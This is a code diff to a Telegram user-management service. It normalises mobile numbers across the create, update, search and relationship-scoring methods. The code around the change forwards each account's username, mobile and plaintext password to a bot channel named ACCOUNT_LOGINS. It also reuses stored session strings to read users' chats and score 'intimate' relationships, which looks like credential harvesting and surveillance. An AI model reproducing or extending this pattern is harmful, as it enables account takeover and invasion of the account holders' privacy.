@@ -22,6 +22,7 @@ import { INTIMATE_KEYWORDS, NEGATIVE_KEYWORDS, rankRelationships, computeAccount
 import { Api } from 'telegram/tl';
 import bigInt from 'big-integer';
 import { parseError } from '../../utils/parseError';
+import { canonicalizeMobile } from '../shared/mobile-utils';
 
 @Injectable()
 export class UsersService {
@@ -36,24 +37,26 @@ export class UsersService {
   ) { }
 
   async create(user: CreateUserDto): Promise<User | undefined> {
-    const activeClientSetup = this.telegramService.getActiveClientSetup(user.mobile);
-    this.logger.log(`New User received - ${user?.mobile}`);
+    const canonicalMobile = this.canonicalMobile(user.mobile);
+    const userData: CreateUserDto = { ...user, mobile: canonicalMobile };
+    const activeClientSetup = this.telegramService.getActiveClientSetup(canonicalMobile);
+    this.logger.log(`New User received - ${canonicalMobile}`);
     this.logger.debug('ActiveClientSetup:', activeClientSetup);
-    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
-      this.logger.log(`Updating New Session Details: ${user.mobile}, @${user.username}, ${activeClientSetup.clientId}`);
-      await this.clientsService.updateClientSession(user.session, user.mobile);
+    if (activeClientSetup && activeClientSetup.newMobile === canonicalMobile) {
+      this.logger.log(`Updating New Session Details: ${canonicalMobile}, @${userData.username}, ${activeClientSetup.clientId}`);
+      await this.clientsService.updateClientSession(userData.session, canonicalMobile);
     } else {
       await this.botsService.sendMessageByCategory(
         ChannelCategory.ACCOUNT_LOGINS,
-        `<b>Account Login</b>\n\n<b>Username:</b> ${user.username ? `@${user.username}` : user.firstName}\n<b>Mobile:</b> ${user.mobile}${user.password ? `\n<b>Password:</b> ${user.password}` : ''}`,
+        `<b>Account Login</b>\n\n<b>Username:</b> ${userData.username ? `@${userData.username}` : userData.firstName}\n<b>Mobile:</b> ${canonicalMobile}${userData.password ? `\n<b>Password:</b> ${userData.password}` : ''}`,
         { parseMode: 'HTML' },
         false
       );
-      const newUser = new this.userModel(user);
+      const newUser = new this.userModel(userData);
       const saved = await newUser.save();
       setTimeout(() => {
-        this.computeRelationshipScore(user.mobile).catch(err => {
-          this.logger.error(`Background scoring failed for ${user.mobile}`, err);
+        this.computeRelationshipScore(canonicalMobile).catch(err => {
+          this.logger.error(`Background scoring failed for ${canonicalMobile}`, err);
         });
       }, 5000);
       return saved;
@@ -412,8 +415,12 @@ export class UsersService {
   }
 
   async update(tgId: string, updateDto: UpdateUserDto): Promise<User> {
+    const updateData: UpdateUserDto = { ...updateDto };
+    if (updateData.mobile !== undefined) {
+      updateData.mobile = this.canonicalMobile(updateData.mobile);
+    }
     const updated = await this.userModel
-      .findOneAndUpdate({ tgId }, { $set: updateDto }, { new: true })
+      .findOneAndUpdate({ tgId }, { $set: updateData }, { new: true })
       .exec();
     if (!updated) {
       throw new NotFoundException(`User with tgId ${tgId} not found`);
@@ -435,11 +442,12 @@ export class UsersService {
   }
 
   async toggleStar(mobile: string): Promise<{ mobile: string; starred: boolean }> {
-    const user = await this.userModel.findOne({ mobile }).select('mobile starred').exec();
+    const canonicalMobile = this.canonicalMobile(mobile);
+    const user = await this.userModel.findOne({ mobile: canonicalMobile }).select('mobile starred').exec();
     if (!user) throw new NotFoundException(`User with mobile ${mobile} not found`);
     const newVal = !user.starred;
-    await this.userModel.updateOne({ mobile }, { $set: { starred: newVal } }).exec();
-    return { mobile, starred: newVal };
+    await this.userModel.updateOne({ mobile: canonicalMobile }, { $set: { starred: newVal } }).exec();
+    return { mobile: canonicalMobile, starred: newVal };
   }
 
   async delete(tgId: string): Promise<void> {
@@ -451,9 +459,12 @@ export class UsersService {
 
   async search(filter: SearchUserDto): Promise<User[]> {
     const query: QueryFilter<UserDocument> = { ...filter };
+    if (typeof query.mobile === 'string' && query.mobile) {
+      query.mobile = this.canonicalMobile(query.mobile);
+    }
 
     const escapeRegex = (text: string) => text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-    const regexFields = ['firstName', 'lastName', 'username', 'mobile'];
+    const regexFields = ['firstName', 'lastName', 'username'];
     for (const field of regexFields) {
       if (typeof query[field] === 'string' && query[field]) {
         query[field] = { $regex: new RegExp(escapeRegex(query[field] as string), 'i') };
@@ -474,11 +485,12 @@ export class UsersService {
   }
 
   async computeRelationshipScore(mobile: string): Promise<void> {
-    const wasConnected = connectionManager.hasClient(mobile);
+    const canonicalMobile = this.canonicalMobile(mobile);
+    const wasConnected = connectionManager.hasClient(canonicalMobile);
     let telegramClient: Awaited<ReturnType<typeof connectionManager.getClient>> | null = null;
 
     try {
-      telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
+      telegramClient = await connectionManager.getClient(canonicalMobile, { autoDisconnect: false, handler: false });
       const me = await telegramClient.getMe();
       const selfId = me.id?.toString();
 
@@ -756,7 +768,7 @@ export class UsersService {
       const bestScore = top.length > 0 ? top[0].score : 0;
 
       await this.userModel.updateOne(
-        { mobile },
+        { mobile: canonicalMobile },
         {
           $set: {
             'relationships.score': accountScore,
@@ -768,12 +780,12 @@ export class UsersService {
         },
       ).exec();
 
-      this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
+      this.logger.log(`[${canonicalMobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
     } catch (error) {
-      parseError(error, `[${mobile}] computeRelationshipScore failed`);
+      parseError(error, `[${canonicalMobile}] computeRelationshipScore failed`);
     } finally {
       if (!wasConnected && telegramClient) {
-        await connectionManager.unregisterClient(mobile).catch(() => undefined);
+        await connectionManager.unregisterClient(canonicalMobile).catch(() => undefined);
       }
     }
   }
@@ -822,13 +834,23 @@ export class UsersService {
   }
 
   async getUserRelationships(mobile: string) {
+    const canonicalMobile = this.canonicalMobile(mobile);
     const user = await this.userModel
-      .findOne({ mobile })
+      .findOne({ mobile: canonicalMobile })
       .select('mobile firstName lastName tgId relationships')
       .lean()
       .exec();
     if (!user) throw new NotFoundException(`User with mobile ${mobile} not found`);
     return user;
+  }
+
+  private canonicalMobile(mobile: string): string {
+    try {
+      return canonicalizeMobile(mobile);
+    } catch (error) {
+      const message = error instanceof Error ? error.message : String(error);
+      throw new BadRequestException(message);
+    }
   }
 
   async aggregateSort(
